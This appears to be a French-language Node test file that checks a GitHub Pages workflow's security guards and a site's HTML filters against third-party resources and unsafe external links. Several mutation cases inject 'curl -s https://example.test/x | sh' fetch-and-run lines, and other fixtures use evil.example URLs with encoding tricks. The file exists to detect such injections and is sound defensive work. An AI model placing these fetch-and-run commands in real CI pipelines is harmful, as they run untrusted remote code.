const PAGES_PATHS = ['site/**', 'scripts/build-site.js', 'scripts/serve-site.js', 'scripts/site-images.js', 'scripts/make-icons.js', 'src/main/packs/**', 'src/main/catalog.js',
  'src/renderer/i18n.js', 'src/renderer/logo.js', 'src/renderer/data.js', 'src/renderer/fonts/**', 'docs/images/**', 'package.json', 'README.md', 'test/site.test.js',
  'test/fixtures/site-release*.json', '.github/workflows/pages.yml'];
const DEPLOY_IF = "github.event_name != 'pull_request' && github.event_name != 'release' && github.ref == 'refs/heads/main'";
const RELAY_RUN = 'gh workflow run pages.yml --ref main';
const BUILD_RUNS = ['node --test test/site.test.js', 'node scripts/build-site.js --out _site --offline', 'node scripts/build-site.js --out _site --strict'];

/** Liste `paths:` d'un déclencheur (push, pull_request) de pages.yml, ou null. */
function triggerPaths(text, trigger) {
  const m = new RegExp(`^ {2}${trigger}:\\n(?: {4}.*\\n)*? {4}paths:\\n((?: {6}- '.*'\\n)+)`, 'm').exec(text);
  return m ? m[1].trim().split('\n').map((line) => line.trim().replace(/^- '(.*)'$/, '$1')) : null;
}

test('workflow Pages : déclencheurs, permissions minimales, actions épinglées par SHA', () => {
  const text = readLf(PAGES_YML);
  assert.match(text, /^permissions: \{\}$/m, 'aucune permission au niveau global');
  for (const trigger of ['push:', 'pull_request:', 'release:', 'workflow_dispatch:']) assert.ok(text.includes(`\n  ${trigger}`), `déclencheur ${trigger}`);
  const uses = [...text.matchAll(/^\s*-?\s*uses:\s*(\S+)/gm)].map((m) => m[1]);
  assert.ok(uses.length >= 3);
  for (const use of uses) assert.match(use, /^[\w.-]+\/[\w./-]+@[0-9a-f]{40}$/, `action non épinglée par SHA : ${use}`);
  assert.ok(!/configure-pages|setup-node/.test(text.replace(/#.*$/gm, '')), 'ni configure-pages ni setup-node');
  assert.match(text, /persist-credentials: false/);
  assert.match(text, /node --test test\/site\.test\.js/);
  assert.match(text, /node scripts\/build-site\.js --out _site --strict/);
  // les deux listes, au complet et identiques : un fichier qui nourrit la page doit relancer le workflow (push comme pull request)
  for (const trigger of ['push', 'pull_request']) assert.deepEqual([...(triggerPaths(text, trigger) || [])].sort(), [...PAGES_PATHS].sort(), `chemins surveillés (${trigger})`);
  assert.match(text, /environment:\s*\n\s+name: github-pages/);
  assert.match(text, /id-token: write/);
  assert.match(text, /pages: write/);
  assert.match(text, /actions: write/);
});

/** Lit-on le même workflow quand git (core.autocrlf=true) l'écrit en CRLF ? .gitattributes impose LF aux workflows, et les tests ne dépendent pas des fins de ligne. */
test('workflow Pages : un checkout en CRLF (Windows, core.autocrlf=true) donne le même résultat qu’en LF', () => {
  const text = readLf(PAGES_YML);
  assert.ok(!text.includes('\r'));
  const crlf = path.join(tempDir('attack-crlf-'), 'pages.yml');
  fs.writeFileSync(crlf, text.replace(/\n/g, '\r\n'));
  assert.ok(fs.readFileSync(crlf, 'utf8').includes('\r\n'));
  assert.equal(readLf(crlf), text);
  checkPagesGuards(readLf(crlf));
  const attributes = fs.readFileSync(path.join(ROOT, '.gitattributes'), 'utf8').split(/\r?\n/).filter((line) => line.trim() && !line.startsWith('#'));
  assert.deepEqual(attributes, ['.github/workflows/*.yml text eol=lf'], 'seuls les workflows sont forcés en LF (pas de « * text=auto » qui renormaliserait tout le dépôt)');
});

/** Valeur d'un `run:` (une ligne, ou un bloc `|` / `>` sur plusieurs lignes) d'une étape dont les clés sont indentées de 8 espaces. */
function runOf(stepText) {
  const lines = stepText.split('\n');
  const at = lines.findIndex((line) => /^ {8}run:/.test(line));
  if (at === -1) return '';
  const inline = lines[at].replace(/^ {8}run:\s*/, '').trim();
  if (!/^[|>][+-]?$/.test(inline)) return inline;
  const body = [];
  for (const line of lines.slice(at + 1)) {
    if (line.trim() && !/^ {9,}\S/.test(line)) break; // une ligne moins indentée que le bloc : il est fini
    body.push(line.trim());
  }
  return body.join('\n').trim();
}

/** Entrées de `with:` d'une étape ({ path: '_site' }). */
function withOf(stepText) {
  const m = /^ {8}with:\n((?: {10}[\w-]+: .+(?:\n|$))+)/m.exec(stepText);
  return m ? Object.fromEntries(m[1].trim().split('\n').map((line) => [line.slice(0, line.indexOf(':')).trim(), line.slice(line.indexOf(':') + 1).trim()])) : {};
}

/**
 * pages.yml découpé en jobs, sans bibliothèque YAML : { nom: { text, if, needs, permissions, steps: [{ text, if, uses, run, with }] } }.
 * Une étape commence à chaque « - » (avec ou sans `name:`) ; ses clés sont relues à 8 espaces, même la première.
 */
function workflowJobs(text) {
  const body = text.split(/^jobs:\s*$/m)[1];
  assert.ok(body, 'section jobs');
  const jobs = {};
  // identifiant de job GitHub Actions : lettre ou « _ », puis lettres, chiffres, « - » ou « _ » (majuscules comprises)
  for (const block of body.split(/^ {2}(?=[A-Za-z_][\w-]*:\s*$)/m).slice(1)) {
    const name = /^([A-Za-z_][\w-]*):/.exec(block)[1];
    const field = (re) => (re.exec(block) || [])[1];
    const perms = /^ {4}permissions:\n((?: {6}[\w-]+: \w+\n)+)/m.exec(block);
    jobs[name] = {
      text: block,
      if: field(/^ {4}if: (.+)$/m),
      needs: field(/^ {4}needs: (.+)$/m),
      permissions: perms ? Object.fromEntries(perms[1].trim().split('\n').map((line) => line.trim().split(': '))) : null,
      steps: block.split(/^(?= {6}- )/m).slice(1).map((chunk) => {
        const step = chunk.replace(/^ {6}- /, '        ');
        return { text: step, if: (/^ {8}if: (.+)$/m.exec(step) || [])[1], uses: (/^ {8}uses: (\S+)/m.exec(step) || [])[1], run: runOf(step), with: withOf(step) };
      }),
    };
  }
  return jobs;
}

/** Les conditions qui empêchent de déployer une pull request, une release ou une autre branche que main, les permissions de chaque job et ce qui ne doit jamais apparaître. */
function checkPagesGuards(text) {
  const code = text.replace(/#.*$/gm, ''); // sans les commentaires
  assert.ok(!/continue-on-error/.test(code), 'aucune étape ne doit continuer après un échec (continue-on-error)');
  assert.ok(!/\|\|\s*true\b/.test(code), 'aucune commande ne doit masquer son échec (|| true)');
  assert.ok(!/pull_request_target/.test(code), 'pull_request_target (secrets et droits d’écriture pour le code d’une PR) est interdit');
  assert.ok(!/\bsecrets\./.test(code), 'aucun secret du dépôt : seul le jeton du workflow (github.token) est utilisé');
  const jobs = workflowJobs(text);
  assert.deepEqual(Object.keys(jobs).sort(), ['build', 'deploy', 'relay']);
  const { build, deploy, relay } = jobs;
  assert.equal(deploy.if, DEPLOY_IF, 'deploy : condition exacte (main seulement, jamais une pull request ni une release)');
  assert.equal(deploy.needs, 'build', 'deploy : après les tests et la génération');
  assert.deepEqual(deploy.permissions, { pages: 'write', 'id-token': 'write' });
  assert.equal(relay.if, "github.event_name == 'release'");
  assert.deepEqual(relay.permissions, { actions: 'write' }, 'relay : seulement actions: write');
  assert.deepEqual(relay.steps.map((step) => step.run), [RELAY_RUN], 'relay : une seule commande, qui relance pages.yml sur main');
  assert.equal(build.if, "github.event_name != 'release'");
  assert.deepEqual(build.permissions, { contents: 'read' }, 'build : lecture seule');
  const upload = build.steps.find((step) => step.uses && step.uses.startsWith('actions/upload-pages-artifact@'));
  assert.ok(upload, 'étape d’artefact Pages');
  assert.equal(upload.if, "github.event_name != 'pull_request'", 'pas d’artefact pour une pull request');
  assert.equal(upload.with.path, '_site', 'l’artefact est le dossier généré, rien d’autre');
  // la page publiée vient toujours de la vraie release (--strict) ; la release d'essai (--offline) ne sert qu'aux pull requests
  const steps = Object.values(jobs).flatMap((job) => job.steps);
  const generate = steps.filter((step) => step.run.includes('build-site.js'));
  const strict = generate.filter((step) => step.run.includes('--strict'));
  const offline = steps.filter((step) => step.run.includes('--offline')); // dans tout le workflow, y compris un bloc « run: | » sur plusieurs lignes
  assert.equal(generate.length, 2, 'deux étapes de génération');
  assert.ok(generate.every((step) => build.steps.includes(step)), 'la génération se fait dans le job build');
  assert.equal(strict.length, 1, 'une génération --strict');
  assert.equal(strict[0].run, 'node scripts/build-site.js --out _site --strict');
  assert.equal(strict[0].if, "github.event_name == 'push' || github.event_name == 'workflow_dispatch'", 'génération --strict : push et lancement manuel seulement');
  assert.equal(offline.length, 1, 'une seule étape --offline dans tout le workflow');
  assert.ok(!offline.includes(strict[0]), 'génération publiée : jamais sur la release d’essai');
  assert.equal(offline[0].if, "github.event_name == 'pull_request'", 'release d’essai : pull requests seulement');
  // build : exactement ces commandes, telles quelles (une commande ajoutée ou un échec masqué, « || exit 0 », « ; true »…, est refusé)
  assert.deepEqual(build.steps.map((step) => step.run).filter(Boolean), BUILD_RUNS, 'build : commandes exactes');
  for (const name of ['relay', 'build']) assert.ok(!jobs[name].text.includes('deploy-pages'), `${name} : ne déploie pas`);
  // deploy (droits pages et id-token en écriture) : une seule étape, l'action deploy-pages, sans aucune commande
  assert.equal(deploy.steps.length, 1, 'deploy : une seule étape');
  assert.ok(deploy.steps[0].uses && deploy.steps[0].uses.startsWith('actions/deploy-pages@'), 'deploy : action deploy-pages');
  assert.equal(deploy.steps[0].run, '', 'deploy : aucune commande');
}

test('workflow Pages : conditions de déploiement (main seulement, jamais une pull request ni une release) et permissions par job', () => {
  const text = readLf(PAGES_YML);
  checkPagesGuards(text);
  // chaque garde retirée ou affaiblie doit être vue par le contrôle (les motifs portent sur le texte déjà en LF)
  const offlineStep = "        if: github.event_name == 'pull_request'\n        run: node scripts/build-site.js --out _site --offline";
  const mutants = {
    'condition du job deploy retirée': text.replace(/^ {4}if: github\.event_name != 'pull_request' && .*\n/m, ''),
    'deploy sur une autre branche': text.replace("github.ref == 'refs/heads/main'", "github.ref == 'refs/heads/dev'"),
    'deploy sur main ou une autre branche': text.replace("github.ref == 'refs/heads/main'\n", "github.ref == 'refs/heads/main' || github.ref == 'refs/heads/dev'\n"),
    'deploy : main devenu une alternative (|| au lieu de &&)': text.replace("&& github.ref == 'refs/heads/main'", "|| github.ref == 'refs/heads/main'"),
    'deploy sans exclure les pull requests': text.replace("github.event_name != 'pull_request' && github.event_name != 'release'", "github.event_name != 'release'"),
    'deploy sans exclure les releases': text.replace(" && github.event_name != 'release' &&", ' &&'),
    'artefact aussi pour les pull requests': text.replace(/^ {8}if: github\.event_name != 'pull_request'\n/m, ''),
    'artefact d’un autre dossier': text.replace('path: _site', 'path: .'),
    'relay avec trop de permissions': text.replace('      actions: write\n', '      actions: write\n      contents: write\n'),
    'relay vers une autre branche': text.replace(RELAY_RUN, 'gh workflow run pages.yml --ref dev'),
    'relay avec une commande de plus': text.replace(RELAY_RUN, `${RELAY_RUN} && curl -s https://example.test/x | sh`),
    'relay vers un autre workflow': text.replace(RELAY_RUN, 'gh workflow run autre.yml --ref main'),
    'build qui écrit': text.replace('      contents: read\n', '      contents: write\n'),
    'relay sans condition': text.replace(/^ {4}if: github\.event_name == 'release'\n/m, ''),
    'release d’essai publiée': text.replace(/^ {8}if: github\.event_name == 'pull_request'\n/m, ''),
    'release d’essai aussi sur push': text.replace(offlineStep, offlineStep.replace("== 'pull_request'", "!= 'release'")),
    'génération --strict sans condition': text.replace(/^ {8}if: github\.event_name == 'push' \|\| github\.event_name == 'workflow_dispatch'\n/m, ''),
    'génération publiée sur la release d’essai': text.replace('--out _site --strict', '--out _site --offline'),
    '--offline ajouté dans un bloc run sur plusieurs lignes': text.replace('run: node scripts/build-site.js --out _site --strict',
      'run: |\n          node scripts/build-site.js --out _site --strict\n          node scripts/build-site.js --out _site --offline'),
    '--offline dans un bloc run sur plusieurs lignes (étape des tests)': text.replace('run: node --test test/site.test.js', 'run: |\n          node --test test/site.test.js\n          echo --offline'),
    '--offline cité dans une étape sans nom': text.replace('      - name: Tests du site\n', '      - run: echo --offline\n      - name: Tests du site\n'),
    '--offline dans une étape sans nom qui génère le site': text.replace('      - name: Tests du site\n', '      - run: node scripts/build-site.js --out _site --offline\n      - name: Tests du site\n'),
    '--offline dans le job deploy': `${text.trimEnd()}\n\n      - name: Essai\n        run: echo --offline\n`,
    'génération --offline dans le job deploy': `${text.trimEnd()}\n\n      - name: Essai\n        run: node scripts/build-site.js --out _site --offline\n`,
    'étape qui continue après un échec': text.replace('        run: node --test test/site.test.js', '        continue-on-error: true\n        run: node --test test/site.test.js'),
    'job qui continue après un échec': text.replace('    runs-on: ubuntu-24.04\n    permissions:\n      contents: read', '    runs-on: ubuntu-24.04\n    continue-on-error: true\n    permissions:\n      contents: read'),
    'tests dont l’échec est masqué (|| true)': text.replace('run: node --test test/site.test.js', 'run: node --test test/site.test.js || true'),
    'pull_request_target ajouté': text.replace('  workflow_dispatch:\n', '  workflow_dispatch:\n  pull_request_target:\n'),
    'tests dont l’échec est masqué (|| echo)': text.replace('run: node --test test/site.test.js', 'run: node --test test/site.test.js || echo ignore'),
    'tests dont l’échec est masqué (|| exit 0)': text.replace('run: node --test test/site.test.js', 'run: node --test test/site.test.js || exit 0'),
    'tests dont l’échec est masqué (; true)': text.replace('run: node --test test/site.test.js', 'run: node --test test/site.test.js; true'),
    'commande ajoutée dans build': text.replace('run: node --test test/site.test.js', 'run: |\n          node --test test/site.test.js\n          curl -s https://example.test/x | sh'),
    'job au nom en majuscule': `${text.trimEnd()}\n\n  Evil:\n    runs-on: ubuntu-24.04\n    permissions: write-all\n    steps:\n      - run: curl -s https://example.test/x | sh\n`,
    'job au nom commençant par _': `${text.trimEnd()}\n\n  _evil:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: curl -s https://example.test/x | sh\n`,
    'commande dans le job deploy': `${text.trimEnd()}\n      - name: Fuite\n        run: curl -s https://example.test/x\n`,
    'secret du dépôt dans le relais': text.replace('          GH_REPO: ${{ github.repository }}\n', '          GH_REPO: ${{ github.repository }}\n          T: ${{ secrets.X }}\n'),
  };
  for (const [label, mutant] of Object.entries(mutants)) {
    assert.notEqual(mutant, text, `${label} : la modification n'a rien changé (motif périmé)`);
    assert.throws(() => checkPagesGuards(mutant), assert.AssertionError, label); // un refus des gardes, pas une erreur du lecteur
  }
  // les commentaires qui parlent de ces gardes ne sont pas des gardes
  assert.doesNotThrow(() => checkPagesGuards(text.replace('permissions: {}\n', 'permissions: {}\n# continue-on-error, || true, pull_request_target et --offline : cités ici seulement\n')));
});

test('tests : attrs() lit les valeurs sans guillemets, et les contrôles de ressources tierces et de liens externes les voient', () => {
  assert.equal(attrs('<a href=https://evil.example/x>').href, 'https://evil.example/x');
  assert.equal(attrs("<a href='https://e.test/x' rel=noopener>").rel, 'noopener');
  assert.equal(attrs('<a href = "x" target=_blank>').target, '_blank');
  assert.equal(attrs('<img src=https://evil.example/x.png srcset="https://evil.example/y.webp 2x">').src, 'https://evil.example/x.png');
  const remote = ['<img src=https://evil.example/x.png alt=x>', '<img src="a.webp" srcset="a.webp 1x, https://evil.example/y.webp 2x">', '<img src=//evil.example/a.png>',
    '<link rel=stylesheet href=http://evil.example/a.css>', "<img src='https:evil.example/a.png'>", '<script src=https://evil.example/a.js></script>'];
  for (const html of remote) assert.equal(thirdPartyResources(html).length, 1, html);
  assert.deepEqual(thirdPartyResources('<img src="img/a.webp" srcset="img/a.webp 1x, img/b.webp 2x"><link rel="canonical" href="https://7shiki3.github.io/attack-launcher/"><link rel=stylesheet href=styles.css>'), []);
  const badLinks = ['<a href=https://evil.example/x>', '<a href="//evil.example/x" rel="noopener noreferrer">', '<a href="http://github.com/x" rel="noopener noreferrer">',
    '<a href="https://github.com/x">', '<a href=https://github.com/x rel=noopener>', '<a href=https://github.com/x rel="noopener noreferrer" ><a href=https://evil.example/y rel="noopener noreferrer">'];
  for (const html of badLinks) assert.ok(externalLinkProblems(html).length > 0, html);
  assert.deepEqual(externalLinkProblems('<a href=https://github.com/x rel="noopener noreferrer">ok</a> <a href="#faq">ancre</a> <a href="en/">en</a> <a href="https://7shiki3.github.io/attack-launcher/en/">site</a>'), []);

  // références HTML numériques et nommées, tabulations, barres obliques inverses : le navigateur lit la même adresse que le contrôle
  assert.equal(decode('&#47;&#x2F;&#X2f;&colon;&sol;&bsol;&amp;&quot;&#39;&lt;&gt;'), '///:/\\&"\'<>');
  assert.equal(decode('&amp;#47;'), '&#47;', 'une référence doublement codée n’est décodée qu’une fois');
  assert.equal(decode('&nosuch; &#99999999;'), '&nosuch; &#99999999;');
  assert.equal(urlOf('\t https:&#47;&#47;a\\b\n '), 'https://a/b');
  const encoded = ['<img src="&#47;&#47;evil.example/a.png">', '<img src="&#x2F;&#x2f;evil.example/a.png">', '<img src="https&colon;&sol;&sol;evil.example/a.png">',
    '<img src="https&#58;//evil.example/a.png">', '<img src="ht&#9;tps://evil.example/a.png">', '<img src="\\\\evil.example\\a.png">', '<img src="/\\evil.example/a.png">',
    '<link rel=stylesheet href="&#x2f;&#92;evil.example/a.css">', '<img srcset="a.webp 1x, &#47;&#47;evil.example/b.webp 2x">'];
  for (const html of encoded) assert.equal(thirdPartyResources(html).length, 1, html);
  assert.deepEqual(thirdPartyResources('<img src="&#47;attack-launcher&#47;img&#47;a.webp"><img src="&amp;#47;&amp;#47;a.png">'), [], 'un chemin du site et une référence doublement codée ne sont pas des ressources tierces');
  // références numériques sans « ; » (acceptées par les navigateurs) et virgule codée dans un srcset
  assert.equal(decode('&#47&#47a&#x2Fz'), '//a/z'); // hexadécimal sans « ; » : les chiffres sont lus tant qu'ils en sont (« &#x2Fb » serait U+2FB)
  const unterminated = ['<img src="&#47&#47evil.example/a.png">', '<img src="https&#58//evil.example/a.png">', '<img src="&#92&#92evil.example/a.png">',
    '<img srcset="a.webp 1x&#44; //evil.example/b.webp 2x">', '<img srcset="a.webp 1x&comma; //evil.example/b.webp 2x">'];
  for (const html of unterminated) assert.equal(thirdPartyResources(html).length, 1, html);
  assert.ok(externalLinkProblems('<a href="&#47&#47evil.example/x" rel="noopener noreferrer">x</a>').length > 0, 'lien en &#47&#47 sans « ; »');
  assert.deepEqual(thirdPartyResources('<img srcset="&amp;#47;&amp;#47;a.png 1x, img/b.webp 2x">'), [], 'srcset : une référence doublement codée n’est décodée qu’une fois');
  const encodedLinks = ['<a href="&#47;&#47;evil.example/x" rel="noopener noreferrer">', '<a href="&#x2F;&#x2F;evil.example/x" rel="noopener noreferrer">',
    '<a href="https&colon;&sol;&sol;evil.example/x" rel="noopener noreferrer">', '<a href="\\\\evil.example\\x" rel="noopener noreferrer">', '<a href="/\\evil.example/x" rel="noopener noreferrer">',
    '<a href="ht&#10;tps://evil.example/x" rel="noopener noreferrer">', '<a href="h&#116;tps&colon;//github.com/x">'];
  for (const html of encodedLinks) assert.ok(externalLinkProblems(html).length > 0, html);
  assert.deepEqual(externalLinkProblems('<a href="https://github.com/x?a=1&amp;b=2&#x23;c" rel="noopener noreferrer">ok</a> <a href="&#35;faq">ancre</a>'), []);

  // attribut en double : la première occurrence gagne, comme dans un navigateur (les noms avec chiffres sont lus en entier)
  assert.equal(attrs('<a href="x" href="https://evil.example/y">').href, 'x');
  assert.equal(attrs('<a HREF=https://evil.example/y href=x>').href, 'https://evil.example/y');
  assert.equal(attrs('<img data-src2="x" src=y>')['data-src2'], 'x');
  assert.equal(thirdPartyResources('<img src=a.webp src=https://evil.example/b.png>').length, 0, 'seule la première src compte');
  assert.equal(thirdPartyResources('<img src=https://evil.example/b.png src=a.webp>').length, 1);
  assert.ok(externalLinkProblems('<a href=https://evil.example/y href=x>').length > 0);
  assert.deepEqual(externalLinkProblems('<a href=#faq href=https://evil.example/y>'), []);

  // un > entre guillemets ne ferme pas la balise : la suite de la balise (src, href, gestionnaire) reste vue
  assert.deepEqual(tagsOf('<img alt="a>b" src=x.png><p>', 'img'), ['<img alt="a>b" src=x.png>']);
  assert.deepEqual(tagsOf("<a title='x>y' href=z>t</a><a href=w>", 'a'), ["<a title='x>y' href=z>", '<a href=w>']);
  assert.deepEqual(tagsOf('<abbr title=x><img/src=y>', 'a'), [], '<abbr> n’est pas un <a>');
  assert.deepEqual(tagsOf('<img src="x', 'img'), ['<img src="x'], 'une balise jamais fermée est lue jusqu’à la fin');
  assert.deepEqual(tagsOf('<p onclick="a>b"><img alt=it\'s src=y>', '[a-z][^\\s/>]*'), ['<p onclick="a>b">', "<img alt=it's src=y>"], 'une apostrophe hors valeur entre guillemets n’ouvre rien');
  assert.equal(thirdPartyResources('<img alt="a>b" src=https://evil.example/x.png>').length, 1);
  assert.ok(externalLinkProblems('<a title="1 > 0" href=https://evil.example/x>').length > 0);
});

test('captures : plus de recadrage CSS, et la commande site:images exige --sources sans toucher aux images avant d’avoir tout encodé', () => {
  assert.ok(!/shot-crop/.test(fs.readFileSync(path.join(REAL_SRC, 'styles.css'), 'utf8') + fs.readFileSync(path.join(REAL_SRC, 'template.html'), 'utf8')), 'le recadrage de la capture « Compte » est dans le fichier image');
  const code = fs.readFileSync(path.join(ROOT, 'scripts', 'site-images.js'), 'utf8').replace(/^\s*\/\/.*$/gm, '');
  assert.match(code, /--sources <dossier> est obligatoire/);
  assert.ok(!code.includes('docs/images') && !/'docs'/.test(code), 'docs/images n’est plus une source des images du site');
  const encoded = code.indexOf("fs.writeFileSync(path.join(STAGING, 'manifest.json')");
  const removed = code.indexOf("file.endsWith('.webp')");
  assert.ok(encoded > 0 && removed > encoded, 'les anciens WebP ne sont retirés qu’après l’encodage de toutes les images');
  assert.ok(code.includes("path.join(STAGING, 'og.png')") && !code.includes("path.join(OUT, 'og.png'), png"), 'og.png vient des sources, via le dossier d’attente');
  assert.ok(code.includes("path.join(STAGING, 'og-en.png')") && !code.includes("path.join(OUT, 'og-en.png')"), 'og-en.png (accueil anglais) vient lui aussi des sources, via le dossier d’attente');
  // une capture plus étroite que la plus grande largeur prévue est refusée avant tout encodage : aucune largeur n'est ignorée en silence
  const narrow = code.indexOf('capture trop étroite');
  assert.ok(narrow > 0 && narrow < encoded && narrow < removed, 'la capture trop étroite fait échouer la commande avant le remplacement des images');
  assert.match(code, /capture trop étroite : \$\{source\.width\} px, minimum \$\{widest\} px/);
  assert.match(code, /const widest = Math\.max\(\.\.\.job\.widths\)/);
  assert.ok(!/width > source\.width\)\s*continue/.test(code), 'plus de largeur sautée en silence');
  // le refus est exécuté, pas seulement lu dans le code (require ne charge pas Electron)
  const images = require(path.join(ROOT, 'scripts', 'site-images.js'));
  const launcher = { origin: 'sources/launcher-home-fr.png', widths: images.LAUNCHER_WIDTHS };
  assert.throws(() => images.checkSource(launcher, { width: 1119, height: 700 }), /capture trop étroite : 1119 px, minimum 1120 px/);
  assert.doesNotThrow(() => images.checkSource(launcher, { width: 1120, height: 700 }));
  const client = { origin: 'sources/client-menu-en.png', widths: images.CLIENT_WIDTHS };
  assert.throws(() => images.checkSource(client, { width: 853, height: 480 }), /capture trop étroite : 853 px, minimum 854 px/);
  assert.doesNotThrow(() => images.checkSource(client, { width: 854, height: 480 }));
  const account = { origin: 'sources/launcher-account-fr.png', widths: images.LAUNCHER_WIDTHS, cropHeight: images.KEYS['launcher-account'].cropHeight };
  assert.throws(() => images.checkSource(account, { width: 1120, height: 617 }), /moins que la coupe prévue \(618 px\)/);
  assert.doesNotThrow(() => images.checkSource(account, { width: 1120, height: 618 }));
});
